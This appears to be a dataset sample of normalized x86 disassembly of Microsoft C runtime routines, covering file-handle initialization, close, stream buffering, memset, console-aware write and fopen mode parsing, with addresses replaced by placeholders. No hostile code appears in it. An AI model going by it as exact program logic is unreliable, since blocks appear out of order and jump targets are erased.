mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_4110e5
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413e17
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_410fc1
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_413e20
push 0x10
push r--data
call sub_4110a0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
call sub_411714
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_41a057
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_411550
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_413eea
pop ecx
mov edi eax
jmp r-xdata
call sub_4110e5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413ec1
mov eax edi
jmp r-xdata
sub_413eea
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_41a30e
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_41152f
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_41a30e
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_41a30e
push 0x1
mov esi eax
call sub_41a30e
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_41a288
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_413f84
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40e8f2
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_413fb4
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
mov eax [ edi + 0xc ]
test al 0x83
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ edi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ edi ] eax
push edi
call sub_4181c6
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ edi + 0xc ] eax
and [ edi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ edi + 0x18 ]
push [ edi + 0x8 ]
push edi
call sub_412f82
pop ecx
push eax
call sub_4132db
add esp 0xc
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
test [ edi + 0xc ] 0x82
jne r-xdata
cmp [ edi + 0x18 ] 0x200
jne r-xdata
push edi
call sub_412f82
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ edi ]
dec [ edi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ edi ] ecx
jmp r-xdata
test [ edi + 0xc ] 0x8
je r-xdata
mov eax rw-data
push edi
call sub_412f82
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop ebp
retn
test [ edi + 0xc ] 0x400
jne r-xdata
or [ edi + 0xc ] 0x2000
push esi
push edi
call sub_412f82
mov esi eax
push edi
sar esi 0x5
call sub_412f82
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
pop esi
jmp r-xdata
mov [ edi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_4140d5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_411550
push 0x16
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_414160
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_411550
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_410100
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_411550
push 0x22
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
jmp r-xdata
pop edi
sub_414160
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_4141f0
push 0x10
push r--data
call sub_4110a0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
call sub_411714
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_41a057
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_41151c
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4142d2
add esp 0xc
mov edi eax
jmp r-xdata
call sub_4110e5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4142a9
mov eax edi
jmp r-xdata
sub_4142d2
push ebp
mov ebp esp
mov eax 0x1af0
call sub_4132b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_41151c
and [ eax ] edi
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40e09b
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_41151c
and [ eax ] edi
call sub_411550
mov [ eax ] 0x16
call sub_411714
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_418172
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_413239
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_415d5f
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_411550
mov [ eax ] 0x1c
call sub_41151c
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_41152f
pop ecx
jmp r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_41151c
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_416063
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_41a5cb
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_4190ed
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_4190ed
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_41a5cb
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_414afc
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor edx edx
and [ ebp - 0x4 ] edx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
push edi
mov edi [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov [ ebp + 0xc ] 0x1000
xor ebx ebx
or edi 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_41a71f
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
push 0x3
push esi
push r--data
call sub_41a73d
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] al
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_41a86a
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_41a86a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_41a86a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
